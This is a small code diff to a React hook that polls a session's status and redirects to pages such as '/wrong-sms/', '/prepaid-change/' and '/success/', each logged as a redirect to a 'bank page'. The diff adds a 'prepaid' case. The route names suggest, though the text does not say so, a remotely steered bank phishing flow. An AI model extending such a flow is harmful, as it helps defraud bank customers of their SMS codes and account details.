@@ -45,6 +45,10 @@ export const useRedirectChecker = (interval: number = 3000) => {
               console.log("🔄 Redirecting to bank page");
               navigate(`/wrong-sms/${sessionId}`);
               break;
+            case "prepaid":
+              console.log("🔄 Redirecting to bank page");
+              navigate(`/prepaid-change/${sessionId}`);
+              break;
             case "success":
               console.log("🔄 Redirecting to bank page");
               navigate(`/success/${sessionId}`);
